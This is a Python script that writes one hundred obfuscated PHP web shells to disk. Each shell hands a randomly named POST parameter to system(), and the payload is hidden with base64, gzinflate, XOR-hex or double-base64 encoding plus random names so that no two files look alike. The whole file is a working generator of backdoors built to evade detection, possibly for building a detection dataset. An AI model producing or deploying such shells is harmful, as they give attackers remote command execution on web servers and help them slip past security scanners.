import os
import base64
import random
import string
import zlib
from hashlib import md5
from pathlib import Path
OUTPUT_DIR = Path("/data/php_webshellv7")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def xor_encrypt(s, key):
    return ''.join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(s)])

def generate_payload():
    return '<?php ${VAR} = {CODE}; {EVAL}(${VAR}); ?>'

def generate_eval():
    eval_variants = [
        'eval(${VAR})',
        'e'.upper() + 'val(${VAR})',
        '@eval(${VAR})'
    ]
    return random.choice(eval_variants)

def double_base64_encode(s):
    return base64.b64encode(base64.b64encode(s.encode())).decode()

def xor_hex_encode(s):
    key = random_string(4)
    encrypted = xor_encrypt(s, key)
    hexed = encrypted.encode().hex()
    return key, hexed

def gzip_b64_encode(s):
    raw_deflate = zlib.compress(s.encode())[2:-4]
    return base64.b64encode(raw_deflate).decode()

def generate_variant():
    var_name = random_string()
    param_name = random_string()
    actual_code = f'if(isset($_POST["{param_name}"])){{system($_POST["{param_name}"]);}}'

    encoding_method = random.choice(['base64', 'gzip', 'xor', 'double_base64'])

    if encoding_method == 'base64':
        encoded = base64.b64encode(actual_code.encode()).decode()
        decode_snippet = f'${var_name} = base64_decode("{encoded}");'
    elif encoding_method == 'gzip':
        encoded = gzip_b64_encode(actual_code)
        decode_snippet = f'${var_name} = gzinflate(base64_decode("{encoded}"));'
    elif encoding_method == 'xor':
        key, hexed = xor_hex_encode(actual_code)
        decode_snippet = f'${var_name} = ""; $_ = "{hexed}"; $k = "{key}";' \
                         f'for($i=0;$i<strlen($_);$i+=2){{${var_name} .= chr(hexdec(substr($_,$i,2))^ord($k[$i%strlen($k)]));}}'
    else:
        encoded = double_base64_encode(actual_code)
        decode_snippet = f'${var_name} = base64_decode(base64_decode("{encoded}"));'

    eval_expr = generate_eval().replace('{VAR}', var_name)
    final_php = f'<?php {decode_snippet} {eval_expr}; ?>'
    return final_php, param_name

def generate_samples(n=100):
    for i in range(n):
        shell, param_name = generate_variant()
        with open(os.path.join(OUTPUT_DIR, f'shell_{i}.php'), 'w') as f:
            f.write(shell)
        print(f"shell_{i}.php parameter name: {param_name}")
    print(f"Generated {n} WebShells to {OUTPUT_DIR}")

if __name__ == '__main__':
    generate_samples(100)
